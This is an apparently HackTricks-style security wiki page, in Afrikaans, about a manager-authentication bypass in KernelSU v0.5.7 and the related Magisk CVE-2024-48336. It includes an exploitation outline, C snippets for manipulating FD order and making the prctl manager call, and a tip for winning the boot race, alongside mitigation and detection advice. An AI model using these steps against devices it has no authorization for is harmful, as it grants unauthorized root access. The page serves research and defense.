# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks soos KernelSU, APatch en SKRoot patch of hook die Android/Linux-kernel en stel bevoorregte funksionaliteit aan ’n onbevoorregte userspace manager-app bloot. Magisk word afsonderlik hieronder bespreek omdat CVE-2024-48336 manager-side code loading behels het eerder as hierdie KernelSU-syscall path.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Hierdie bladsy abstraheer die tegnieke en slaggate wat in openbare navorsing blootgelê is (veral Zimperium se ontleding van KernelSU v0.5.7) om beide red- en blue teams te help om attack surfaces, exploitation primitives en robuuste mitigations te verstaan.<sup>[[1]](#references)</sup>

---
## Argitektuurpatroon: syscall-hooked manager channel

- In KernelSU v0.5.7 ontvang ’n kernel hook op `prctl` ’n magic value, command ID en command-specific arguments vanaf userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Die caller versoek eers manager status met `CMD_BECOME_MANAGER`. Authorization is command-specific: `CMD_GRANT_ROOT` kontroleer die manager/allowlist state, `CMD_ALLOW_SU` is manager-only, en `CMD_SET_SEPOLICY` is root-only in hierdie weergawe.<sup>[[2]](#references)[[11]](#references)</sup>
- Ander commands vra version/configuration of rapporteer framework events.<sup>[[2]](#references)</sup>
- Omdat enige app hierdie syscall interface kan invoke, is die korrektheid van manager authentication krities.<sup>[[1]](#references)[[2]](#references)</sup>

Voorbeeld (KernelSU design):
- Hooked syscall: prctl
- Magic value om na KernelSU handler te divert: 0xDEADBEEF
- Commands sluit in: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, ens.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (soos geïmplementeer)

Wanneer userspace `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)` call, verifieer KernelSU:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- Die verskafde path moet met ’n verwagte prefix vir die caller UID begin, byvoorbeeld /data/data/<pkg> of /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Die path moet deur die caller UID besit word.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- Iterate deur die calling process se oop file descriptors in toenemende descriptor order.
- Vir elke regular file waarvan die path met `/data/app/` begin en met `/base.apk` eindig, vereis dat die path die package substring bevat wat van die verskafde data-directory path afgelei is.
- Verifieer die signature van die eerste candidate wat daardie path checks slaag.
- Parse APK v2 signature en verifieer dit teen die amptelike manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

As al die checks slaag, cache die kernel die manager se UID tydelik; manager-only commands aanvaar dan daardie UID, terwyl ander commands hul eie UID- of allowlist checks behou.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 bind nie die signature result aan PackageManager se geïnstalleerde package identity nie. In `manager.c` is die package test slegs ’n path substring check (`strstr(cwd, pkg)`); die eerste candidate wat hierdie test slaag, word dan signature-checked. ’n Attacker kan dus ’n genuine manager APK onder ’n `/data/app/` path plaas wat ook die attacker se package name bevat, en dit so arrangeer dat dit eerste selected word.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Hierdie trust-by-indirection laat ’n onbevoorregte app toe om die manager te impersonate sonder om die manager se signing key te besit.<sup>[[1]](#references)</sup>

Key properties wat exploited word:<sup>[[1]](#references)[[3]](#references)</sup>
- Die FD scan is volgens descriptor index georden en die package check is ’n path substring test, nie ’n geverifieerde package-to-APK identity binding nie.
- `open()` gee die laagste beskikbare FD terug. Deur laer-genommerde FDs eers te close, kan ’n attacker die ordering beheer.
- ’n Bundled manager APK kan onder `/data/app/` geplaas word by ’n path wat die attacker se package string bevat, terwyl die amptelike manager signature behou word.

---
## Attack preconditions

Die konkrete KernelSU v0.5.7 case vereis:<sup>[[1]](#references)[[3]](#references)</sup>

- Die device is reeds rooted met ’n vulnerable rooting framework (byvoorbeeld KernelSU v0.5.7).
- Die attacker kan arbitrêre onbevoorregte code plaaslik run (Android app process).
- Vir die v0.5.7-implementering moet `current->real_parent` UID 0 hê (die source comment beskryf dit as ’n zygote direct-child requirement); `manager.c` reject ander parents.<sup>[[3]](#references)</sup>
- Die werklike manager het nog nie geauthenticate nie (byvoorbeeld direk ná ’n reboot). Sommige frameworks cache die manager UID ná sukses; jy moet die race wen.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps (die aangehaalde demo video wys die openbare proof of concept in werking):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Build ’n geldige path na jou eie app data directory om aan die prefix- en ownership checks te voldoen.
2) Plaas ’n genuine KernelSU Manager base.apk onder `/data/app/` by ’n path wat jou package string bevat, en open dit op ’n laer-genommerde FD as jou eie base.apk.
3) Invoke `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)` om die checks te slaag.
4) Gebruik `CMD_GRANT_ROOT`, gevolg deur `CMD_ALLOW_SU` vir persistente su; invoke root-only `CMD_SET_SEPOLICY` slegs nadat root verkry is en slegs waar dit supported word.

Praktiese notas oor stap 2 (FD ordering):<sup>[[1]](#references)</sup>
- Identifiseer jou process se FD vir jou eie /data/app/*/base.apk deur /proc/self/fd symlinks te walk.
- Close ’n lae FD (byvoorbeeld stdin, fd 0) en open die legitimate manager APK eerste sodat dit fd 0 (of enige index laer as jou eie base.apk fd) beset.
- Bundle die legitimate manager APK met jou app sodat sy path met `/data/app/` begin, met `/base.apk` eindig en jou package string bevat. Byvoorbeeld, ’n path onder jou app se `lib` directory kan aan hierdie checks voldoen.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, slegs illustratief):

Enumerate open FDs om base.apk entries te locate:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Dwing 'n FD met 'n laer nommer om na die legitieme manager APK te wys:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Bestuurder-verifikasie via die KernelSU v0.5.7 `prctl` hook:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Na sukses, bevoorregte commands (voorbeelde):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: bevorder huidige proses na root
- CMD_ALLOW_SU: voeg jou package/UID by die allowlist vir persistente su
- CMD_SET_SEPOLICY: pas SELinux-beleid aan nadat root verkry is; KernelSU v0.5.7 kontroleer UID 0 vir hierdie command.<sup>[[2]](#references)</sup>

Race/persistence-wenk:
- Registreer ’n BOOT_COMPLETED receiver in AndroidManifest (`RECEIVE_BOOT_COMPLETED`) om ná reboot te begin en authentication voor die werklike manager te probeer; die permission magtig ontvangs van `ACTION_BOOT_COMPLETED`, maar waarborg nie op sigself scheduling-prioriteit nie.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Detection and mitigation guidance

Vir framework-ontwikkelaars:
- Bind authentication aan die caller se package/UID, nie aan arbitrêre FDs nie:
- Bepaal die caller se package vanaf sy UID en verifieer dit teen die geïnstalleerde package se signature (via PackageManager) eerder as om FDs te skandeer.
- Indien kernel-only, gebruik stabiele caller identity (task creds) en valideer teen ’n stabiele source of truth wat deur init/userspace helper bestuur word, nie teen process FDs nie.
- Vermy path-prefix-kontroles as identity; dit kan triviaal deur die caller bevredig word.
- Gebruik nonce-gebaseerde challenge–response oor die channel en verwyder enige cached manager identity tydens boot of by sleutelgebeurtenisse.
- Oorweeg binder-gebaseerde authenticated IPC in plaas daarvan om generiese syscalls te oorlaai waar dit haalbaar is.

Vir defenders/blue team:
- Detecteer die teenwoordigheid van rooting frameworks en manager-prosesse; monitor vir prctl calls met verdagte magic constants (byvoorbeeld 0xDEADBEEF) indien jy kernel telemetry het.<sup>[[1]](#references)[[11]](#references)</sup>
- Op bestuurde fleets, blokkeer of waarsku oor boot receivers van untrusted packages wat vinnig ná boot bevoorregte manager commands probeer uitvoer.
- Verseker dat devices na patched framework-weergawes opgedateer is; invalidate cached manager IDs tydens ’n update.

Beperkings van die attack:<sup>[[1]](#references)[[2]](#references)</sup>
- Dit raak slegs devices wat reeds met ’n vulnerable framework geroot is.
- Dit vereis tipies ’n reboot/race window voordat die legitimate manager authenticate (sommige frameworks cache die manager UID totdat dit reset word).

---
## Related notes across frameworks

- Password-gebaseerde auth (byvoorbeeld historiese APatch/SKRoot builds) kan swak wees indien passwords guessable/bruteforceable is of validations foutief is.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-gebaseerde auth (byvoorbeeld KernelSU) is in beginsel sterker, maar moet aan die werklike caller gebind word, nie aan path-derived artefacts wat deur FD-scans gekies word nie.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 het pre-Canary 27007 builds geraak wat code vanaf ’n ongeverifieerde GMS package gelaai het, waardeur ’n local app code in die Magisk-app kon uitvoer en na root kon eskaleer sonder user interaction.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Die rooting van alle kwaad: Sekuriteitsgate wat jou mobile device kan kompromitteer](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – authentication-kontroles in core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – FD-iterasie, package-kontrole en signature-call in manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – APK v2-verifikasie in apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU-projek](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk-issue #8279 – Verifieer dat GMS ’n system app is](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU PoC-demo-video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – command-identifiseerders in ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
